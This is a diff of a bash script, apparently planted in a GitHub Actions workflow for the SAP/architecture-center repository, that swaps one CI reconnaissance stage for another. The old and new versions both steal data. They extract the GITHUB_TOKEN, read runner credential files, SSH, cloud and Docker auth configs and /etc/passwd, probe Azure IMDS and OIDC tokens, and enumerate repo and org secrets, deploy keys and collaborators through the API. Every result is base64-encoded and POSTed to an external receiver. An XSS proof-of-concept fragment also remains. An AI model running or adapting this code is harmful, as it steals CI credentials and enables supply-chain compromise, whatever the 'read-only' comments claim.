@@ -1,131 +1,174 @@
 #!/bin/bash
-# Recon5: Cloud metadata, Docker socket, OIDC token probes
-# Read-only, non-destructive
+# Recon6: Runner internals, GitHub API enumeration, filesystem recon
+# All read-only, non-destructive
 
 RECEIVER_URL="https://sap-test-receiver-production-f76d.up.railway.app/collect"
 
-# --- 1. Azure IMDS (Instance Metadata Service) ---
-# GitHub-hosted runners are on Azure. IMDS at 169.254.169.254 requires Metadata:true header.
-
-IMDS_BASE="http://169.254.169.254/metadata"
-
-# Instance metadata
-IMDS_INSTANCE=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
-  "$IMDS_BASE/instance?api-version=2021-02-01" 2>/dev/null || echo "UNREACHABLE")
-curl -s -X POST "$RECEIVER_URL?stage=imds_instance" \
-  -d "$(echo "$IMDS_INSTANCE" | base64 -w0)" || true
-
-# Network metadata
-IMDS_NETWORK=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
-  "$IMDS_BASE/instance/network?api-version=2021-02-01" 2>/dev/null || echo "UNREACHABLE")
-curl -s -X POST "$RECEIVER_URL?stage=imds_network" \
-  -d "$(echo "$IMDS_NETWORK" | base64 -w0)" || true
-
-# Identity / managed identity token (would allow Azure API access)
-IMDS_IDENTITY=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
-  "$IMDS_BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || echo "UNREACHABLE")
-curl -s -X POST "$RECEIVER_URL?stage=imds_identity" \
-  -d "$(echo "$IMDS_IDENTITY" | base64 -w0)" || true
-
-# Attested data
-IMDS_ATTESTED=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
-  "$IMDS_BASE/attested/document?api-version=2021-02-01" 2>/dev/null || echo "UNREACHABLE")
-curl -s -X POST "$RECEIVER_URL?stage=imds_attested" \
-  -d "$(echo "$IMDS_ATTESTED" | base64 -w0)" || true
-
-# --- 2. Docker Socket Probe ---
-# The drawio export step uses DOCKER=1. Check if Docker socket is accessible.
-
-DOCKER_SOCK="/var/run/docker.sock"
-DOCKER_RESULTS=""
-
-if [ -e "$DOCKER_SOCK" ]; then
-  DOCKER_RESULTS="socket_exists=yes"
-  # Check permissions
-  DOCKER_PERMS=$(ls -la "$DOCKER_SOCK" 2>/dev/null)
-  DOCKER_RESULTS="$DOCKER_RESULTS|perms=$DOCKER_PERMS"
-  # Check if we can query Docker API via socket
-  DOCKER_INFO=$(curl -sf --unix-socket "$DOCKER_SOCK" http://localhost/info 2>/dev/null || echo "ACCESS_DENIED")
-  DOCKER_RESULTS="$DOCKER_RESULTS|info_len=${#DOCKER_INFO}"
-  DOCKER_IMAGES=$(curl -sf --unix-socket "$DOCKER_SOCK" http://localhost/images/json 2>/dev/null || echo "ACCESS_DENIED")
-  DOCKER_RESULTS="$DOCKER_RESULTS|images_len=${#DOCKER_IMAGES}"
-  DOCKER_CONTAINERS=$(curl -sf --unix-socket "$DOCKER_SOCK" http://localhost/containers/json?all=true 2>/dev/null || echo "ACCESS_DENIED")
-  DOCKER_RESULTS="$DOCKER_RESULTS|containers_len=${#DOCKER_CONTAINERS}"
-  # Send full Docker info
-  curl -s -X POST "$RECEIVER_URL?stage=docker_info" \
-    -d "$(echo "$DOCKER_INFO" | base64 -w0)" || true
-  curl -s -X POST "$RECEIVER_URL?stage=docker_images" \
-    -d "$(echo "$DOCKER_IMAGES" | base64 -w0)" || true
-  curl -s -X POST "$RECEIVER_URL?stage=docker_containers" \
-    -d "$(echo "$DOCKER_CONTAINERS" | base64 -w0)" || true
-else
-  DOCKER_RESULTS="socket_exists=no"
-  # Check if docker CLI is available
-  DOCKER_CLI=$(which docker 2>/dev/null || echo "not_found")
-  DOCKER_RESULTS="$DOCKER_RESULTS|cli=$DOCKER_CLI"
-  DOCKER_VERSION=$(docker version 2>&1 || echo "unavailable")
-  DOCKER_RESULTS="$DOCKER_RESULTS|version_len=${#DOCKER_VERSION}"
-  curl -s -X POST "$RECEIVER_URL?stage=docker_version" \
-    -d "$(echo "$DOCKER_VERSION" | base64 -w0)" || true
+# --- Extract GITHUB_TOKEN from git extraheader ---
+TOKEN=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2-)
+if [ -z "$TOKEN" ]; then
+  TOKEN="$GITHUB_TOKEN"
 fi
-curl -s "$RECEIVER_URL?stage=docker_probe&result=$(echo "$DOCKER_RESULTS" | head -c 500 | base64 -w0)" || true
 
-# --- 3. OIDC Token Probe ---
-# Check if GitHub Actions OIDC is configured (ACTIONS_ID_TOKEN_REQUEST_URL)
+# --- 1. Runner Agent Internals ---
 
-OIDC_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
-OIDC_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
-OIDC_RESULTS=""
+# Runner home directory listing
+RUNNER_HOME=$(ls -la /home/runner/ 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=runner_home" \
+  -d "$(echo "$RUNNER_HOME" | base64 -w0)" || true
 
-if [ -n "$OIDC_URL" ]; then
-  OIDC_RESULTS="oidc_configured=yes|url=$OIDC_URL"
-  # Try to request an OIDC token (read-only, doesn't grant any access by itself)
-  OIDC_RESPONSE=$(curl -sf -H "Authorization: bearer $OIDC_TOKEN" \
-    "$OIDC_URL&audience=api://AzureADTokenExchange" 2>/dev/null || echo "REQUEST_FAILED")
-  OIDC_RESULTS="$OIDC_RESULTS|response_len=${#OIDC_RESPONSE}"
-  curl -s -X POST "$RECEIVER_URL?stage=oidc_token" \
-    -d "$(echo "$OIDC_RESPONSE" | base64 -w0)" || true
-else
-  OIDC_RESULTS="oidc_configured=no"
-fi
-curl -s "$RECEIVER_URL?stage=oidc_probe&result=$(echo "$OIDC_RESULTS" | base64 -w0)" || true
+# Runner credentials file
+RUNNER_CREDS=$(cat /home/runner/.credentials 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=runner_creds" \
+  -d "$(echo "$RUNNER_CREDS" | base64 -w0)" || true
 
-# --- 4. ACTIONS_RUNTIME_TOKEN + Cache API Probe ---
-# Check if we can interact with the Actions cache API
+# Runner config
+RUNNER_CONFIG=$(cat /home/runner/.runner 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=runner_config" \
+  -d "$(echo "$RUNNER_CONFIG" | base64 -w0)" || true
 
-CACHE_URL="$ACTIONS_CACHE_URL"
-RUNTIME_TOKEN="$ACTIONS_RUNTIME_TOKEN"
+# Runner env file
+RUNNER_ENV=$(cat /home/runner/.env 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=runner_env" \
+  -d "$(echo "$RUNNER_ENV" | base64 -w0)" || true
 
-if [ -n "$CACHE_URL" ] && [ -n "$RUNTIME_TOKEN" ]; then
-  CACHE_RESULTS="cache_api=available|url=$CACHE_URL"
-  # List existing cache entries (read-only)
-  CACHE_LIST=$(curl -sf \
-    -H "Authorization: Bearer $RUNTIME_TOKEN" \
-    -H "Accept: application/json;api-version=6.0-preview.1" \
-    "${CACHE_URL}_apis/artifactcache/caches" 2>/dev/null || echo "LIST_FAILED")
-  CACHE_RESULTS="$CACHE_RESULTS|list_len=${#CACHE_LIST}"
-  curl -s -X POST "$RECEIVER_URL?stage=cache_list" \
-    -d "$(echo "$CACHE_LIST" | base64 -w0)" || true
-else
-  CACHE_RESULTS="cache_api=unavailable"
-fi
-curl -s "$RECEIVER_URL?stage=cache_probe&result=$(echo "$CACHE_RESULTS" | base64 -w0)" || true
+# Runner path file
+RUNNER_PATH=$(cat /home/runner/.path 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=runner_path" \
+  -d "$(echo "$RUNNER_PATH" | base64 -w0)" || true
 
-# --- 5. Additional Environment Probes ---
-# Network interfaces, DNS, and other runner details
+# Actions runner install directory
+RUNNER_DIR_LIST=$(ls -la /home/runner/runners/ 2>/dev/null || ls -la /opt/actions-runner/ 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=runner_dir" \
+  -d "$(echo "$RUNNER_DIR_LIST" | base64 -w0)" || true
 
-NET_INFO=$(ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "unavailable")
-curl -s -X POST "$RECEIVER_URL?stage=net_info" \
-  -d "$(echo "$NET_INFO" | base64 -w0)" || true
+# Runner worker config (may have org/repo details)
+WORKER_CONFIG=$(find /home/runner -name "*.json" -maxdepth 3 2>/dev/null | head -20)
+curl -s -X POST "$RECEIVER_URL?stage=runner_json_files" \
+  -d "$(echo "$WORKER_CONFIG" | base64 -w0)" || true
 
-DNS_CONFIG=$(cat /etc/resolv.conf 2>/dev/null || echo "unavailable")
-curl -s -X POST "$RECEIVER_URL?stage=dns_config" \
-  -d "$(echo "$DNS_CONFIG" | base64 -w0)" || true
+# --- 2. GitHub API Enumeration (read-only with GITHUB_TOKEN) ---
 
-# Check for .npmrc tokens
-NPMRC=$(cat ~/.npmrc 2>/dev/null; cat .npmrc 2>/dev/null; echo "---")
-curl -s -X POST "$RECEIVER_URL?stage=npmrc" \
-  -d "$(echo "$NPMRC" | base64 -w0)" || true
+REPO="SAP/architecture-center"
+API="https://api.github.com"
+AUTH_HEADER="Authorization: token $TOKEN"
+
+# List secret names (not values — API only returns names)
+SECRETS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/actions/secrets" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_secrets" \
+  -d "$(echo "$SECRETS" | base64 -w0)" || true
+
+# List org-level secrets accessible to this repo
+ORG_SECRETS=$(curl -sf -H "$AUTH_HEADER" "$API/orgs/SAP/actions/secrets" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_org_secrets" \
+  -d "$(echo "$ORG_SECRETS" | base64 -w0)" || true
+
+# List environments (may have deployment protection rules)
+ENVIRONMENTS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/environments" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_environments" \
+  -d "$(echo "$ENVIRONMENTS" | base64 -w0)" || true
+
+# List repository variables
+VARIABLES=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/actions/variables" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_variables" \
+  -d "$(echo "$VARIABLES" | base64 -w0)" || true
+
+# List org-level variables
+ORG_VARIABLES=$(curl -sf -H "$AUTH_HEADER" "$API/orgs/SAP/actions/variables" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_org_variables" \
+  -d "$(echo "$ORG_VARIABLES" | base64 -w0)" || true
+
+# List repository deploy keys
+DEPLOY_KEYS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/keys" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_deploy_keys" \
+  -d "$(echo "$DEPLOY_KEYS" | base64 -w0)" || true
+
+# List webhooks (may reveal integration URLs)
+WEBHOOKS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/hooks" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_webhooks" \
+  -d "$(echo "$WEBHOOKS" | base64 -w0)" || true
+
+# List collaborators and their permission levels
+COLLABORATORS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/collaborators?per_page=100" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_collaborators" \
+  -d "$(echo "$COLLABORATORS" | base64 -w0)" || true
+
+# Check branch protection rules
+BRANCH_PROTECTION_DEV=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/branches/dev/protection" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_branch_prot_dev" \
+  -d "$(echo "$BRANCH_PROTECTION_DEV" | base64 -w0)" || true
+
+BRANCH_PROTECTION_MAIN=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/branches/main/protection" 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=api_branch_prot_main" \
+  -d "$(echo "$BRANCH_PROTECTION_MAIN" | base64 -w0)" || true
+
+# List environments' secrets (per environment)
+ENV_NAMES=$(echo "$ENVIRONMENTS" | python3 -c "import sys,json; [print(e['name']) for e in json.load(sys.stdin).get('environments',[])]" 2>/dev/null)
+for ENV_NAME in $ENV_NAMES; do
+  ENV_SECRETS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/environments/$ENV_NAME/secrets" 2>/dev/null || echo "DENIED")
+  curl -s -X POST "$RECEIVER_URL?stage=api_env_secrets_${ENV_NAME}" \
+    -d "$(echo "$ENV_SECRETS" | base64 -w0)" || true
+done
+
+# --- 3. Filesystem Recon ---
+
+# SSH keys
+SSH_DIR=$(ls -la ~/.ssh/ 2>/dev/null; ls -la /home/runner/.ssh/ 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_ssh" \
+  -d "$(echo "$SSH_DIR" | base64 -w0)" || true
+
+# SSH known_hosts (reveals what hosts the runner connects to)
+SSH_KNOWN=$(cat ~/.ssh/known_hosts 2>/dev/null; cat /home/runner/.ssh/known_hosts 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_ssh_known" \
+  -d "$(echo "$SSH_KNOWN" | base64 -w0)" || true
+
+# Git credential helpers
+GIT_CONFIG=$(git config --list --show-origin 2>/dev/null || echo "UNAVAILABLE")
+curl -s -X POST "$RECEIVER_URL?stage=fs_git_config" \
+  -d "$(echo "$GIT_CONFIG" | base64 -w0)" || true
+
+# Tool cache directory (shows pre-installed tool versions)
+TOOL_CACHE=$(ls -la /opt/hostedtoolcache/ 2>/dev/null || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=fs_toolcache" \
+  -d "$(echo "$TOOL_CACHE" | base64 -w0)" || true
+
+# Detailed tool cache contents
+TOOL_CACHE_FULL=$(find /opt/hostedtoolcache/ -maxdepth 2 -type d 2>/dev/null | head -50 || echo "NOT_FOUND")
+curl -s -X POST "$RECEIVER_URL?stage=fs_toolcache_full" \
+  -d "$(echo "$TOOL_CACHE_FULL" | base64 -w0)" || true
+
+# Docker config (registry auth)
+DOCKER_CONFIG=$(cat ~/.docker/config.json 2>/dev/null; cat /home/runner/.docker/config.json 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_docker_config" \
+  -d "$(echo "$DOCKER_CONFIG" | base64 -w0)" || true
+
+# Cloud CLI configs (az, gcloud, aws)
+AZURE_CONFIG=$(ls -la ~/.azure/ 2>/dev/null; cat ~/.azure/azureProfile.json 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_azure_config" \
+  -d "$(echo "$AZURE_CONFIG" | base64 -w0)" || true
+
+AWS_CONFIG=$(cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_aws_config" \
+  -d "$(echo "$AWS_CONFIG" | base64 -w0)" || true
+
+GCP_CONFIG=$(ls -la ~/.config/gcloud/ 2>/dev/null; cat ~/.config/gcloud/properties 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_gcp_config" \
+  -d "$(echo "$GCP_CONFIG" | base64 -w0)" || true
+
+# /etc/passwd (shows all users on the system)
+ETC_PASSWD=$(cat /etc/passwd 2>/dev/null || echo "DENIED")
+curl -s -X POST "$RECEIVER_URL?stage=fs_passwd" \
+  -d "$(echo "$ETC_PASSWD" | base64 -w0)" || true
+
+# Crontabs
+CRONTAB=$(crontab -l 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; echo "---")
+curl -s -X POST "$RECEIVER_URL?stage=fs_crontab" \
+  -d "$(echo "$CRONTAB" | base64 -w0)" || true
+
+# Sudoers (can runner escalate to root?)
+SUDOERS=$(sudo -l 2>/dev/null || echo "NO_SUDO")
+curl -s -X POST "$RECEIVER_URL?stage=fs_sudoers" \
+  -d "$(echo "$SUDOERS" | base64 -w0)" || true
 
 # Keep the XSS PoC page
 mkdir -p static
@@ -145,5 +188,5 @@ alert(document.domain);
 </html>
 XEOF
 
-curl -s "$RECEIVER_URL?stage=recon5_complete" || true
+curl -s "$RECEIVER_URL?stage=recon6_complete" || true
 exit 0
